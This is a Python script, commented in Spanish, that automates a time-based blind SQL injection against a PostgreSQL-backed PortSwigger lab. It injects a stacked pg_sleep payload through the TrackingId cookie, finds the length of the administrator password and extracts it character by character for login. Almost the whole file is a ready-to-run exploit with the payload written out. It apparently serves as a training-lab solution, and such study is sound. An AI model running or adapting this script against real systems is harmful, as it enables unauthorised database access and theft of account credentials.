#!/usr/bin/env python3
"""
Blind SQL injection con RETARDOS DE TIEMPO + extracción de datos (PortSwigger, PostgreSQL).

Idea: la web no devuelve nada ni cambia, pero podemos APILAR una consulta con ';'
(PostgreSQL permite stacked queries) que duerme SOLO si nuestra condición es cierta.
Preguntamos letra a letra: "¿el carácter N de la contraseña es 'x'?" -> si sí, pg_sleep.
Medimos cuánto tarda la respuesta para saber el sí/no.

Payload inyectado en la cookie TrackingId:
  x'%3BSELECT CASE WHEN (username='administrator'
        AND SUBSTRING(password,N,1)='c') THEN pg_sleep(S) ELSE pg_sleep(0) END FROM users--
(%3B es ';' codificado para que no rompa la cabecera Cookie)

USO (en Kali):
  1) Entra al lab, abre Burp y copia de la petición GET / tu cookie 'session'
     (y la URL del lab). Pégalas abajo en CONFIG.
  2) python3 extraer_password_time.py
  Solo en el laboratorio / con autorización.
"""
import sys, time

try:
    import requests
except ImportError:
    sys.exit("Falta 'requests'. Instala: pip install requests")

# ---------------- CONFIG (rellena con lo tuyo) ----------------
LAB     = "https://TU-LAB-ID.web-security-academy.net"   # <- URL del laboratorio
SESSION = "PEGA_AQUI_TU_SESSION"                          # <- cookie 'session' (de Burp)
SLEEP   = 3        # segundos que duerme si la condición es cierta
UMBRAL  = 2.0      # si la respuesta tarda más que esto -> condición cierta
CHARSET = "abcdefghijklmnopqrstuvwxyz0123456789"          # la clave suele ser alfanumérica
MAXLEN  = 25       # posiciones máximas a probar
# --------------------------------------------------------------


def tarda(condicion):
    """Envía el payload con 'condicion' y devuelve cuánto tardó la respuesta (segundos)."""
    payload = ("x'%3BSELECT CASE WHEN (" + condicion +
               ") THEN pg_sleep(" + str(SLEEP) + ") ELSE pg_sleep(0) END FROM users--")
    cookie = "TrackingId=" + payload + "; session=" + SESSION
    t0 = time.time()
    try:
        requests.get(LAB + "/", headers={"Cookie": cookie}, timeout=SLEEP + 15)
    except requests.exceptions.ReadTimeout:
        return SLEEP + 15
    return time.time() - t0


def es_verdad(condicion):
    return tarda(condicion) > UMBRAL


def main():
    if "TU-LAB-ID" in LAB or "PEGA_AQUI" in SESSION:
        sys.exit("[!] Edita CONFIG: pon la URL del lab y tu cookie 'session' (de Burp).")

    # 0) Comprobación: que el canal temporal funciona (condición siempre cierta)
    print("[*] Probando el canal de tiempo (debe tardar ~%ss)..." % SLEEP)
    if not es_verdad("1=1"):
        sys.exit("[!] No hay retardo con 1=1. Revisa LAB/SESSION o el payload.")
    print("[+] Canal de tiempo OK.\n")

    # 1) Longitud de la contraseña (búsqueda incremental)
    print("[*] Averiguando la longitud...")
    longitud = 0
    for n in range(1, MAXLEN + 1):
        if es_verdad("username='administrator' AND LENGTH(password)>%d" % n):
            longitud = n + 1
        else:
            if longitud == 0:
                longitud = n   # por si >1 ya era falso
            break
    print("[+] Longitud aproximada: %d\n" % longitud)
    total = longitud if longitud else 20

    # 2) Carácter a carácter
    print("[*] Extrayendo la contraseña...")
    clave = ""
    for pos in range(1, total + 1):
        encontrado = ""
        for c in CHARSET:
            cond = ("username='administrator' AND SUBSTRING(password,%d,1)='%s'" % (pos, c))
            if es_verdad(cond):
                encontrado = c
                break
        if not encontrado:
            break   # fin de la contraseña
        clave += encontrado
        print("    [%2d] %s" % (pos, clave))

    print("\n" + "=" * 50)
    print("  CONTRASEÑA de administrator: %s" % clave)
    print("=" * 50)
    print("\nInicia sesión: administrator / %s" % clave)


if __name__ == "__main__":
    main()
